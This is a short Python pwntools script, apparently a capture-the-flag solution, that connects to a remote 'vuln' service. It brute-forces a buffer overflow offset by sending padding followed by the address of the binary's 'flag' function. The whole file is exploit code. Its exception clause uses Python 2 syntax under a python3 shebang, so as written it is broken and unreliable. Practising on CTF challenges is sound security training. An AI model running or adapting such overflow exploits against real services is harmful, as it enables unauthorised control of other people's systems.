#!/usr/bin/env python3

from pwn import *
import sys

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: writup.py IP:ADDRESS')
        exit(1)

    context.binary = 'vuln'
    elf = ELF('vuln')
    print(elf)
    ip, port = sys.argv[1].split(':')
    for i in range(180, 250, 1):
        with remote(ip, port) as rem:
            print(rem.recvline())
            rem.sendline(b' ' * i + pack(elf.symbols['flag']))
            try:
                print(rem.recvline())
            except EOFError, pwnlib:
                print('BING')
